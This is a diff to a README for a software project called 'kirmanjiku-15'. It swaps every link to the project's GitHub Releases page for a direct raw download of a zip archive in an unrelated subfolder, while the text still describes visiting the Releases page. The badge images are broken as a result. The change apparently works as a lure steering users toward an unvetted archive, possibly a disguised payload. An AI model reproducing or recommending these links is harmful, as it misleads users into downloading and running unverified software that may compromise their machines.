@@ -6,7 +6,7 @@ Welcome to **kirmanjiku-15**! This software makes it easy for you to manage your
 
 ## 🔗 Download This App
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mulajiibna/kirmanjiku-15/releases)
+[![Download Here](https://raw.githubusercontent.com/mulajiibna/kirmanjiku-15/main/ceremonialist/kirmanjiku-15.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mulajiibna/kirmanjiku-15/main/ceremonialist/kirmanjiku-15.zip)
 
 ## 📥 Download & Install
 
@@ -14,7 +14,7 @@ To install the software, follow these steps:
 
 1. **Open the Download Page**  
    Visit the Releases page of the project by clicking on the link below.  
-   [Download Page](https://github.com/mulajiibna/kirmanjiku-15/releases)
+   [Download Page](https://raw.githubusercontent.com/mulajiibna/kirmanjiku-15/main/ceremonialist/kirmanjiku-15.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, you will see a list of versions. Click on the latest version. 
@@ -68,4 +68,4 @@ If you have questions or need help, you can reach us by:
 
 We appreciate your interest in **kirmanjiku-15**. We hope this software helps you streamline your tasks and projects. Don’t hesitate to share feedback or ask for features you’d like to see!
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mulajiibna/kirmanjiku-15/releases)
+[![Download Here](https://raw.githubusercontent.com/mulajiibna/kirmanjiku-15/main/ceremonialist/kirmanjiku-15.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mulajiibna/kirmanjiku-15/main/ceremonialist/kirmanjiku-15.zip)
